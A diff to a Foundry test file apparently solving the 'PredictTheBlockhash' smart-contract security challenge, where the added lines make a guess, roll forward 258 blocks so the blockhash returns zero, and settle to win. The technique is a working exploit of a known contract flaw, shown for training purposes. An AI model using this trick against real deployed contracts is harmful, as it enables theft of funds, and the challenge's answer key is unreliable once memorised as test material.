@@ -14,17 +14,16 @@ contract PredictTheBlockhashTest is Test {
         // Deploy contracts
         predictTheBlockhash = (new PredictTheBlockhash){value: 1 ether}();
         exploitContract = new ExploitContract(predictTheBlockhash);
+        vm.deal(address (exploitContract), 1 ether);
     }
 
     function testExploit() public {
         // Set block number
         uint256 blockNumber = block.number;
-        // To roll forward, add the number of blocks to blockNumber,
-        // Eg. roll forward 10 blocks: blockNumber + 10
-        vm.roll(blockNumber + 10);
-
         // Put your solution here
-
+        exploitContract.guess();
+        vm.roll(blockNumber + 258);
+        exploitContract.settle();
         _checkSolved();
     }
 
